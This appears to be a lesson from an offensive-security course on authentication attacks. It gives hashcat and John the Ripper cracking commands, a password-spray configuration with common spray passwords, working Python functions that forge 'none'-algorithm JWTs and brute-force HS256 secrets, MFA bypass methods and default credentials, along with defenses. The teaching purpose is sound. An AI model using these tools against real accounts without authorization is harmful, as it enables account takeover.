# Authentication Attacks

**Previous**: [05. Web Application Hacking](./05_Web_Application_Hacking.md) | **Next**: [07. Server-Side Attacks](./07_Server_Side_Attacks.md)

---

Authentication is the gateway to every system. When it fails, attackers gain access to user accounts, administrative panels, and sensitive data. This lesson covers the full spectrum of authentication attacks, from password cracking and credential stuffing to session hijacking and multi-factor authentication bypass.

> **IMPORTANT**: All techniques described in this lesson must only be used against systems you own or have explicit written authorization to test. Unauthorized access is a criminal offense.

**Difficulty**: ⭐⭐⭐

## Learning Objectives

After completing this lesson, you will be able to:

1. Understand password hashing algorithms and their weaknesses
2. Use hashcat and John the Ripper for offline password cracking
3. Perform credential stuffing attacks using breach databases
4. Hijack and manipulate session tokens
5. Exploit JWT implementation flaws (none algorithm, weak secrets)
6. Identify and exploit OAuth 2.0 misconfigurations
7. Bypass common MFA implementations
8. Implement robust authentication as a defender

---

## Table of Contents

1. [Password Cracking Fundamentals](#1-password-cracking-fundamentals)
2. [Hashcat and John the Ripper](#2-hashcat-and-john-the-ripper)
3. [Rainbow Tables and Time-Memory Tradeoffs](#3-rainbow-tables-and-time-memory-tradeoffs)
4. [Credential Stuffing and Spraying](#4-credential-stuffing-and-spraying)
5. [Session Hijacking and Fixation](#5-session-hijacking-and-fixation)
6. [JWT Token Attacks](#6-jwt-token-attacks)
7. [OAuth 2.0 Vulnerabilities](#7-oauth-20-vulnerabilities)
8. [MFA Bypass Techniques](#8-mfa-bypass-techniques)
9. [Default and Weak Credentials](#9-default-and-weak-credentials)
10. [Authentication Defense Strategies](#10-authentication-defense-strategies)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. Password Cracking Fundamentals

### 1.1 Password Hashing Algorithms

| Algorithm | Speed | Security | Salt | Notes |
|-----------|-------|----------|------|-------|
| MD5 | Very Fast | Broken | No | Never use for passwords |
| SHA-1 | Fast | Weak | No | Deprecated |
| SHA-256 | Fast | OK alone | No | Too fast for passwords |
| bcrypt | Slow | Strong | Yes | Adaptive cost factor |
| scrypt | Slow | Strong | Yes | Memory-hard |
| Argon2 | Slow | Best | Yes | Winner of PHC, memory-hard |
| PBKDF2 | Slow | Good | Yes | NIST recommended |

### 1.2 Attack Types

```python
"""
Password hash analysis module for authorized security assessments.

Identifies hash types and recommends cracking strategies
for penetration test engagements.
"""

import hashlib
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class HashType(Enum):
    """Common password hash types."""
    MD5 = "MD5"
    SHA1 = "SHA-1"
    SHA256 = "SHA-256"
    SHA512 = "SHA-512"
    BCRYPT = "bcrypt"
    NTLM = "NTLM"
    MYSQL = "MySQL"
    PBKDF2 = "PBKDF2"
    ARGON2 = "Argon2"
    UNKNOWN = "Unknown"


@dataclass
class HashAnalysis:
    """Analysis of a password hash."""
    hash_value: str
    hash_type: HashType
    hashcat_mode: int = 0
    estimated_crack_time: str = ""
    recommendations: list[str] = field(default_factory=list)


def identify_hash(hash_str: str) -> HashAnalysis:
    """Identify the hash type based on format and length."""
    h = hash_str.strip()

    # bcrypt
    if h.startswith("$2b$") or h.startswith("$2a$") or h.startswith("$2y$"):
        return HashAnalysis(h, HashType.BCRYPT, hashcat_mode=3200,
            estimated_crack_time="Hours to days (slow hash)",
            recommendations=["Use rule-based attack", "Target weak passwords only"])

    # Argon2
    if h.startswith("$argon2"):
        return HashAnalysis(h, HashType.ARGON2, hashcat_mode=0,
            estimated_crack_time="Very slow — may not be practical",
            recommendations=["Focus on dictionary + rules", "Consider other vectors"])

    # PBKDF2
    if h.startswith("pbkdf2") or h.startswith("$pbkdf2"):
        return HashAnalysis(h, HashType.PBKDF2, hashcat_mode=10000,
            estimated_crack_time="Slow — depends on iterations",
            recommendations=["Check iteration count", "Dictionary + rules"])

    # NTLM (32 hex chars)
    if re.match(r'^[a-fA-F0-9]{32}$', h) and ':' not in hash_str:
        return HashAnalysis(h, HashType.NTLM, hashcat_mode=1000,
            estimated_crack_time="Minutes (fast hash)",
            recommendations=["Full charset brute-force feasible", "Use large wordlists"])

    # MD5 (32 hex chars)
    if re.match(r'^[a-fA-F0-9]{32}$', h):
        return HashAnalysis(h, HashType.MD5, hashcat_mode=0,
            estimated_crack_time="Seconds to minutes",
            recommendations=["Brute-force feasible", "Check rainbow tables first"])

    # SHA-1 (40 hex chars)
    if re.match(r'^[a-fA-F0-9]{40}$', h):
        return HashAnalysis(h, HashType.SHA1, hashcat_mode=100,
            estimated_crack_time="Minutes",
            recommendations=["Large wordlists effective", "Rule-based attacks"])

    # SHA-256 (64 hex chars)
    if re.match(r'^[a-fA-F0-9]{64}$', h):
        return HashAnalysis(h, HashType.SHA256, hashcat_mode=1400,
            estimated_crack_time="Minutes to hours",
            recommendations=["Dictionary + rules", "Targeted wordlists"])

    # SHA-512 (128 hex chars)
    if re.match(r'^[a-fA-F0-9]{128}$', h):
        return HashAnalysis(h, HashType.SHA512, hashcat_mode=1700,
            estimated_crack_time="Hours",
            recommendations=["Dictionary + rules", "Targeted wordlists"])

    return HashAnalysis(h, HashType.UNKNOWN)


def demonstrate_hashing():
    """Show how different algorithms hash the same password."""
    password = "P@ssw0rd123"
    print(f"Password: {password}")
    print(f"  MD5:    {hashlib.md5(password.encode()).hexdigest()}")
    print(f"  SHA-1:  {hashlib.sha1(password.encode()).hexdigest()}")
    print(f"  SHA-256:{hashlib.sha256(password.encode()).hexdigest()}")


if __name__ == "__main__":
    print("Password Hash Analysis Module")
    print("=" * 50)
    demonstrate_hashing()

    test_hashes = [
        "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5
        "$2b$12$LJ3m4ys3Lk1IlSYBgYT8xeQ7FHzF.1GEvSN9Bk8FbhXCJAZvEuG6",  # bcrypt
        "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",  # SHA-1
    ]
    print("\nHash Identification:")
    for h in test_hashes:
        analysis = identify_hash(h)
        print(f"\n  {h[:40]}...")
        print(f"  Type: {analysis.hash_type.value}")
        print(f"  Hashcat mode: {analysis.hashcat_mode}")
        print(f"  Estimated time: {analysis.estimated_crack_time}")
```

---

## 2. Hashcat and John the Ripper

### 2.1 Hashcat Commands

```bash
# Dictionary attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force (8-char lowercase)
hashcat -m 0 hashes.txt -a 3 ?l?l?l?l?l?l?l?l

# Mask attack (Company + digits)
hashcat -m 0 hashes.txt -a 3 Company?d?d?d?d

# Combinator attack
hashcat -m 0 hashes.txt -a 1 words1.txt words2.txt

# Common modes: 0=MD5, 100=SHA1, 1000=NTLM, 1400=SHA256, 3200=bcrypt
```

### 2.2 John the Ripper

```bash
# Auto-detect and crack
john hashes.txt

# Specify format
john --format=raw-md5 hashes.txt

# Wordlist mode
john --wordlist=rockyou.txt hashes.txt

# Rules
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Show cracked passwords
john --show hashes.txt
```

---

## 3. Rainbow Tables and Time-Memory Tradeoffs

Rainbow tables are precomputed hash-to-password lookup tables. They trade storage space for computation time.

**Why salting defeats rainbow tables**: A salt adds unique random data to each password before hashing, making precomputed tables useless since each salt requires a separate table.

---

## 4. Credential Stuffing and Spraying

### 4.1 Credential Stuffing

Uses username/password pairs from data breaches against other services, exploiting password reuse.

### 4.2 Password Spraying

Tries a small number of common passwords against many accounts, avoiding lockout thresholds.

```python
"""
Credential testing framework for authorized assessments.

Demonstrates credential stuffing and password spraying
methodologies used in penetration testing.
ONLY use against authorized targets.
"""

from dataclasses import dataclass, field
from typing import Optional
import time


@dataclass
class CredentialTest:
    """A credential test result."""
    username: str
    password: str
    success: bool
    response_code: int = 0
    error: str = ""


class PasswordSprayConfig:
    """Configuration for password spray attacks."""
    def __init__(
        self,
        usernames: list[str],
        passwords: list[str],
        delay_between_users: float = 0.5,
        delay_between_passwords: float = 1800,  # 30 min between password rounds
        max_attempts_per_user: int = 3,
    ):
        self.usernames = usernames
        self.passwords = passwords
        self.delay_between_users = delay_between_users
        self.delay_between_passwords = delay_between_passwords
        self.max_attempts_per_user = max_attempts_per_user

    def estimate_duration(self) -> str:
        total_seconds = (
            len(self.passwords) * self.delay_between_passwords
            + len(self.usernames) * len(self.passwords) * self.delay_between_users
        )
        hours = total_seconds / 3600
        return f"Estimated duration: {hours:.1f} hours"


# Common passwords for spraying (from breach statistics)
COMMON_PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Company2024", "Company2025", "Summer2024", "Winter2024",
    "Qwerty123", "Admin123", "Letmein1", "Changeme1",
    "P@ssw0rd", "P@ssword1", "Pa$$w0rd",
]


if __name__ == "__main__":
    print("Credential Testing Framework")
    print("=" * 50)
    print(f"Common spray passwords: {len(COMMON_PASSWORDS)}")
    config = PasswordSprayConfig(
        usernames=[f"user{i}" for i in range(100)],
        passwords=COMMON_PASSWORDS[:3],
    )
    print(config.estimate_duration())
    print("\nOnly use in authorized engagements with proper scope.")
```

---

## 5. Session Hijacking and Fixation

### 5.1 Session Hijacking Methods

- **XSS-based**: Steal cookies via `document.cookie`
- **Network sniffing**: Capture session tokens on unencrypted connections
- **Session fixation**: Force a known session ID on the victim
- **Session prediction**: Predict session IDs from weak generation

### 5.2 Secure Cookie Attributes

| Attribute | Purpose | Setting |
|-----------|---------|---------|
| `HttpOnly` | Prevent XSS cookie theft | Always set |
| `Secure` | HTTPS only | Always set |
| `SameSite` | CSRF protection | `Strict` or `Lax` |
| `Path` | Scope limitation | Most specific path |
| `Expires` | Session timeout | Appropriate lifetime |

---

## 6. JWT Token Attacks

### 6.1 Common JWT Vulnerabilities

```python
"""
JWT attack demonstrations for authorized security testing.

Shows common JWT implementation flaws and how to detect them.
"""

import base64
import json
import hmac
import hashlib
from dataclasses import dataclass


@dataclass
class JWTAnalysis:
    """Analysis of a JWT token."""
    header: dict
    payload: dict
    signature: str
    vulnerabilities: list[str]


def decode_jwt(token: str) -> JWTAnalysis:
    """Decode and analyze a JWT token (without verification)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    def b64decode(s: str) -> dict:
        padding = 4 - len(s) % 4
        s += "=" * padding
        return json.loads(base64.urlsafe_b64decode(s))

    header = b64decode(parts[0])
    payload = b64decode(parts[1])

    vulns = []

    # Check for "none" algorithm
    if header.get("alg", "").lower() == "none":
        vulns.append("CRITICAL: 'none' algorithm — signature not verified")

    # Check for weak algorithm
    if header.get("alg") == "HS256":
        vulns.append("INFO: HS256 used — check for weak secret")

    # Check for algorithm confusion (RS256 vs HS256)
    if header.get("alg") in ("RS256", "RS384", "RS512"):
        vulns.append("TEST: Check for algorithm confusion (RS→HS) attack")

    # Check for missing expiration
    if "exp" not in payload:
        vulns.append("MEDIUM: No expiration claim — token never expires")

    # Check for sensitive data in payload
    sensitive_keys = ["password", "secret", "ssn", "credit_card"]
    for key in payload:
        if key.lower() in sensitive_keys:
            vulns.append(f"HIGH: Sensitive data in payload: {key}")

    return JWTAnalysis(
        header=header, payload=payload,
        signature=parts[2], vulnerabilities=vulns,
    )


def forge_none_algorithm(token: str) -> str:
    """
    Forge a JWT with 'none' algorithm (for testing vulnerable implementations).

    This attack works when the server accepts tokens with alg=none,
    effectively skipping signature verification.
    """
    parts = token.split(".")
    # Modify header to use "none" algorithm
    new_header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(new_header).encode()
    ).rstrip(b"=").decode()

    # Keep original payload, empty signature
    return f"{header_b64}.{parts[1]}."


def brute_force_hs256_secret(token: str, wordlist: list[str]) -> str:
    """
    Attempt to brute-force an HS256 JWT secret.

    Weak secrets (short, dictionary words) can be cracked quickly.
    """
    parts = token.split(".")
    message = f"{parts[0]}.{parts[1]}".encode()

    # Decode the signature
    sig_padding = 4 - len(parts[2]) % 4
    expected_sig = base64.urlsafe_b64decode(parts[2] + "=" * sig_padding)

    for secret in wordlist:
        computed = hmac.new(
            secret.encode(), message, hashlib.sha256
        ).digest()
        if hmac.compare_digest(computed, expected_sig):
            return secret

    return ""


if __name__ == "__main__":
    print("JWT Security Analysis Module")
    print("=" * 50)
    # Example JWT (HS256, secret="secret")
    sample = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
        "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )
    analysis = decode_jwt(sample)
    print(f"Header: {analysis.header}")
    print(f"Payload: {analysis.payload}")
    print(f"Vulnerabilities: {analysis.vulnerabilities}")
```

---

## 7. OAuth 2.0 Vulnerabilities

### 7.1 Common OAuth Flaws

- **Open redirect**: Redirect URI not properly validated
- **Authorization code theft**: Leaking codes via Referer header
- **CSRF on OAuth flow**: Missing state parameter
- **Scope escalation**: Requesting broader permissions
- **Token leakage**: Tokens exposed in URLs or logs

---

## 8. MFA Bypass Techniques

| Technique | Description | Difficulty |
|-----------|-------------|------------|
| SIM swapping | Take over victim's phone number | Medium |
| Real-time phishing | Proxy MFA in real-time (evilginx2) | Medium |
| Session hijacking | Steal post-MFA session token | Easy |
| MFA fatigue | Spam push notifications until approval | Easy |
| Recovery code theft | Target backup codes via social engineering | Medium |
| Implementation bugs | Race conditions, code reuse | Varies |

---

## 9. Default and Weak Credentials

Always check for default credentials on discovered services:

| Service | Common Defaults |
|---------|----------------|
| Tomcat Manager | tomcat:tomcat, admin:admin |
| Jenkins | admin:(no password) |
| phpMyAdmin | root:(empty) |
| Cisco devices | cisco:cisco, admin:admin |
| PostgreSQL | postgres:postgres |
| MongoDB | (no auth by default) |

---

## 10. Authentication Defense Strategies

- Use bcrypt/Argon2 with appropriate cost factors
- Implement account lockout with progressive delays
- Require MFA for all privileged accounts
- Use CSRF-protected login forms
- Set secure session cookie attributes
- Implement proper JWT validation (algorithm, expiration, issuer)
- Monitor for credential stuffing patterns

---

## 11. Exercises

1. **Hash Cracking**: Crack a set of 20 password hashes (MD5, SHA-256, bcrypt) using hashcat with dictionary and rule-based attacks.
2. **JWT Analysis**: Decode and analyze JWT tokens from a practice application. Identify and exploit vulnerabilities.
3. **Session Security**: Test session management of a practice app — cookie attributes, session fixation, logout behavior.
4. **Password Spray**: Configure a password spray attack against a lab Active Directory environment. Optimize timing to avoid lockouts.
5. **MFA Testing**: Test MFA implementation in OWASP WebGoat for bypass opportunities.
6. **Defense Implementation**: Implement proper authentication in a Flask application with bcrypt, CSRF tokens, and secure sessions.

---

## 12. Summary

Authentication attacks target the most fundamental security control:

- **Password cracking** exploits weak hashing and poor password choices
- **Credential stuffing** leverages the epidemic of password reuse
- **Session hijacking** bypasses authentication entirely
- **JWT attacks** exploit implementation flaws in token-based auth
- **MFA bypass** shows that additional factors are not invulnerable
- **Defense** requires layered controls: strong hashing, MFA, monitoring

---

## 13. References

- Hashcat: https://hashcat.net/
- John the Ripper: https://www.openwall.com/john/
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- JWT Security: https://portswigger.net/web-security/jwt
- Have I Been Pwned: https://haveibeenpwned.com/
- CrackStation: https://crackstation.net/
